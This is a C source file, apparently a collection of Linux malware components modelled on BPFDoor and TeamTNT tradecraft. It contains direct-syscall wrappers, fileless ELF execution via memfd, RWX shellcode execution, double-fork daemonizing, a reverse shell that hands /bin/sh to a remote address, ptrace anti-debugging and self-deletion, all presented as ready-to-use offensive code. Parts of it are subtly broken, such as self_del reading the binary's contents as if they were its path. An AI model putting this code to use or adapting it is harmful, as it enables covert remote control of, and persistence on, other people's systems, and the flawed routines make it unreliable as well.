/*
 * Linux Syscalls - Direct kernel interface
 * BPFDoor/TeamTNT patterns
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

// ============================================================================
// DIRECT SYSCALL - x86_64
// ============================================================================

long sc0(long n)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n) : "rcx","r11","memory");
    return r;
}

long sc1(long n, long a)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a) : "rcx","r11","memory");
    return r;
}

long sc2(long n, long a, long b)
{
    long r;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a), "S"(b) : "rcx","r11","memory");
    return r;
}

long sc3(long n, long a, long b, long c)
{
    long r;
    register long r10 __asm__("r10") = c;
    __asm__ volatile("syscall" : "=a"(r) : "0"(n), "D"(a), "S"(b), "d"(c) : "rcx","r11","memory");
    return r;
}

long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    long r;
    register long r10 __asm__("r10") = d;
    register long r8  __asm__("r8")  = e;
    register long r9  __asm__("r9")  = f;
    __asm__ volatile("syscall"
        : "=a"(r)
        : "0"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8), "r"(r9)
        : "rcx","r11","memory");
    return r;
}

// ============================================================================
// SYSCALL NUMBERS - x86_64
// ============================================================================

#define NR_read     0
#define NR_write    1
#define NR_open     2
#define NR_close    3
#define NR_mmap     9
#define NR_mprotect 10
#define NR_munmap   11
#define NR_dup2     33
#define NR_socket   41
#define NR_connect  42
#define NR_accept   43
#define NR_fork     57
#define NR_execve   59
#define NR_exit     60
#define NR_kill     62
#define NR_getpid   39
#define NR_getuid   102
#define NR_ptrace   101
#define NR_setsid   112
#define NR_memfd    319

// ============================================================================
// RAW WRITE
// ============================================================================

void rwrite(int fd, const char* b, unsigned long n)
{
    sc3(NR_write, fd, (long)b, n);
}

// ============================================================================
// MEMFD EXEC - Fileless ELF
// ============================================================================

int memfd_exec(unsigned char* elf, unsigned long len, char** av)
{
    int fd = sc2(NR_memfd, (long)"", 1);  // MFD_CLOEXEC
    if(fd < 0) return -1;

    sc3(NR_write, fd, (long)elf, len);

    char p[32];
    char* s = p;
    char* fmt = "/proc/self/fd/";
    while(*fmt) *s++ = *fmt++;

    int t = fd, d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = fd;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
    *s = 0;

    sc3(NR_execve, (long)p, (long)av, 0);
    return -1;
}

// ============================================================================
// SHELLCODE EXEC
// ============================================================================

void sc_exec(unsigned char* sc, unsigned long len)
{
    void* m = (void*)sc6(NR_mmap, 0, len, 7, 0x22, -1, 0);  // RWX, ANON|PRIV
    if((long)m < 0) return;

    unsigned char* d = m;
    unsigned char* s = sc;
    while(len--) *d++ = *s++;

    ((void(*)())m)();
    sc2(NR_munmap, (long)m, len);
}

// ============================================================================
// FORK DETACH - Double fork daemonize
// ============================================================================

int spawn(char* path, char** av)
{
    long pid = sc0(NR_fork);
    if(pid == 0) {
        sc0(NR_setsid);

        long pid2 = sc0(NR_fork);
        if(pid2 > 0) sc1(NR_exit, 0);

        sc1(NR_close, 0);
        sc1(NR_close, 1);
        sc1(NR_close, 2);

        sc3(NR_execve, (long)path, (long)av, 0);
        sc1(NR_exit, 1);
    }
    return pid;
}

// ============================================================================
// REVERSE SHELL - Via syscalls
// ============================================================================

#pragma pack(push,1)
typedef struct {
    unsigned short fam;
    unsigned short port;
    unsigned int   addr;
    char           pad[8];
} SA;
#pragma pack(pop)

void revsh(unsigned int ip, unsigned short port)
{
    SA sa = {0};
    sa.fam = 2;  // AF_INET
    sa.port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF);  // htons
    sa.addr = ip;

    int fd = sc3(NR_socket, 2, 1, 0);  // AF_INET, SOCK_STREAM
    if(fd < 0) return;

    if(sc3(NR_connect, fd, (long)&sa, 16) < 0) {
        sc1(NR_close, fd);
        return;
    }

    sc2(NR_dup2, fd, 0);
    sc2(NR_dup2, fd, 1);
    sc2(NR_dup2, fd, 2);

    char* av[] = {"/bin/sh", 0};
    sc3(NR_execve, (long)"/bin/sh", (long)av, 0);
}

// ============================================================================
// PTRACE CHECK
// ============================================================================

int chk_ptrace(void)
{
    return sc6(NR_ptrace, 0, 0, 0, 0, 0, 0) < 0;  // PTRACE_TRACEME
}

// ============================================================================
// SELF DELETE
// ============================================================================

void self_del(void)
{
    char p[256];
    long n = sc3(NR_read,
        sc2(NR_open, (long)"/proc/self/exe", 0),
        (long)p, 255);
    if(n > 0) {
        p[n] = 0;
        sc1(87, (long)p);  // unlink
    }
}

// ============================================================================
// EOF
// ============================================================================
